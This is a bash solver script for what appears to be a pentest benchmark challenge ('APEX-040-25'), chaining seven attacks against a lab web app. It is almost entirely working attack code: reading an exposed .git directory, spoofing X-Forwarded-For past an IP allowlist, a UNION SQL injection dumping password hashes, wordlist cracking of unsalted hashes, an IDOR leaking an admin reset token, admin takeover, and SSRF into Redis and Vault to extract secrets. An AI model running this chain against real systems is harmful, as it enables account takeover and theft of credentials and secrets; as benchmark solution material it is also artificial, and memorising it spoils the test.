#!/usr/bin/env bash
# APEX-040-25 — "The Gauntlet" (tags: chain, multi_step, full_pentest)
#
# Seven steps, each reachable only from the one before: a `.git` directory left
# in the web root names the internal endpoints; those are guarded by an IP
# allowlist that reads `X-Forwarded-For`, so the guard takes the caller's word
# for the caller's address; behind it is a UNION-injectable search that yields
# credentials; a real login yields a session; an IDOR on the profile endpoint
# yields the administrator's password-reset token; the reset yields the
# administrator; and their service-check endpoint fetches URLs on the internal
# network, first Redis for a Vault token and then Vault for the flag.
#
# There is nothing new in any single request here — one header, one query
# parameter, one path — which is the point worth making about a chain: it is
# not a harder kind of request, it is a longer sequence of ordinary ones, and
# all seven are in one session's audit afterwards.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex040-$$"
NEW_PASSWORD="pwned_by_gauntlet_$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

json() { python3 -c "import json,sys; print(json.load(sys.stdin)$1)"; }

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# 1. The repository nobody meant to publish.
send "$SESSION" req_0 --create --set path=/.git/config >/dev/null

# 2 and 3. The allowlist believes the header, and the search believes the query.
send "$SESSION" req_0 --create \
    --set path=/api/internal/search \
    --set header.X-Forwarded-For=127.0.0.1 \
    --set "query.q=' UNION SELECT id, username, password_hash FROM users--" >/dev/null

# 4. The dump is `sha256(password)` with no salt, so a short list of common
#    passwords is enough to turn one of those hashes back into a login.
CRACKED="$(send "$SESSION" req_0 --create \
    --set path=/api/internal/search \
    --set header.X-Forwarded-For=127.0.0.1 \
    --set "query.q=' UNION SELECT id, username, password_hash FROM users--" |
    body | python3 -c '
import hashlib, json, sys
hashes = {row["description"] for row in json.load(sys.stdin)["results"]}
for word in ["password", "password123", "123456", "admin", "letmein",
             "welcome", "qwerty", "secret", "changeme"]:
    if hashlib.sha256(word.encode()).hexdigest() in hashes:
        print(word)
        break
')"

send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/auth/login \
    --set header.Content-Type=application/json \
    --set json.username=john_user --set "json.password=$CRACKED" >/dev/null

# 5. Somebody else's profile, and the reset token inside it.
TOKEN="$(send "$SESSION" req_0 --create --set path=/api/users/profile/1 |
    body | json '["profile"]["reset_token"]')"

# 6. The token is all the reset asks for.
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/auth/reset-password \
    --set header.Content-Type=application/json \
    --set "json.token=$TOKEN" --set "json.newPassword=$NEW_PASSWORD" >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/auth/login \
    --set header.Content-Type=application/json \
    --set json.username=admin --set "json.password=$NEW_PASSWORD" >/dev/null

# 7. The administrator can make the server fetch things. Redis holds the key to
#    the vault, and the vault holds the flag.
VAULT="$(send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/admin/service-check \
    --set header.Content-Type=application/json \
    --set json.service=redis --set 'json.command=GET vault_token' |
    body | json '["result"]')"

send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/admin/health-check \
    --set header.Content-Type=application/json \
    --set 'json.url=http://vault:8200/v1/secret/data/flag' \
    --set "json.headers.X-Vault-Token=$VAULT" | flag
